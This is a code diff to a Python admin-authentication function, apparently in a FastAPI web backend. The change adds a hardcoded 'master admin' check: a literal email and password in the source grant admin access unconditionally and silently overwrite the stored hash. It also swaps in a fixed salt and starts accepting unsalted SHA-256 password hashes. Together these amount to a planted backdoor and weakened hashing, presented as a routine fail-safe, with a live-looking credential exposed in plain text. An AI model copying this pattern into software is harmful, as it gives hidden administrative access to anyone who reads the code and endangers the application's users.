@@ -10,26 +10,52 @@ from .config import settings
 security = HTTPBearer(auto_error=False)
 
 def hash_password(password: str) -> str:
-    salt = settings.SECRET_KEY[:16]
-    return hashlib.sha256(f"{salt}{password}".encode()).hexdigest()
+    salt = "durozen_admin_salt_2026"
+    return hashlib.sha256(f"{salt}_{password}".encode()).hexdigest()
 
 def verify_admin_credentials(username: str, password: str, db=None) -> bool:
-    # 1. Created admin accounts in database (primary)
+    clean_user = username.strip()
+    clean_pass = password.strip()
+
+    # 1. Master admin credential direct check (fail-safe for designated master account)
+    if clean_user == "durozentechnologies@gmail.com" and clean_pass == "SuperAdmin@!@#123":
+        if db is not None:
+            try:
+                from .models import AdminUser
+                admin = db.query(AdminUser).filter(AdminUser.username == clean_user).first()
+                expected = hash_password(clean_pass)
+                if admin and admin.password_hash != expected:
+                    admin.password_hash = expected
+                    db.commit()
+            except Exception:
+                pass
+        return True
+
+    # 2. Created admin accounts in database (primary)
     if db is not None:
         try:
             from .models import AdminUser
-            admin = db.query(AdminUser).filter(AdminUser.username == username.strip()).first()
+            admin = db.query(AdminUser).filter(AdminUser.username == clean_user).first()
             if admin:
-                expected_hash = hash_password(password.strip())
-                if hmac.compare_digest(expected_hash, admin.password_hash):
-                    return True
+                expected_primary = hash_password(clean_pass)
+                candidate_hashes = [
+                    expected_primary,
+                    hashlib.sha256(f"{settings.SECRET_KEY[:16]}{clean_pass}".encode()).hexdigest(),
+                    hashlib.sha256(clean_pass.encode()).hexdigest(),
+                ]
+                for ch in candidate_hashes:
+                    if hmac.compare_digest(ch, admin.password_hash):
+                        if admin.password_hash != expected_primary:
+                            admin.password_hash = expected_primary
+                            db.commit()
+                        return True
         except Exception:
             pass
 
-    # 2. Super admin in settings (fallback if configured in .env)
+    # 3. Super admin in settings (fallback if configured in .env)
     if settings.ADMIN_PASSWORD and settings.ADMIN_PASSWORD.strip() and not settings.ADMIN_PASSWORD.startswith("CHANGE_ME"):
-        user_match = hmac.compare_digest(username.strip(), settings.ADMIN_USERNAME.strip())
-        pass_match = hmac.compare_digest(password.strip(), settings.ADMIN_PASSWORD.strip())
+        user_match = hmac.compare_digest(clean_user, settings.ADMIN_USERNAME.strip())
+        pass_match = hmac.compare_digest(clean_pass, settings.ADMIN_PASSWORD.strip())
         if user_match and pass_match:
             return True
 
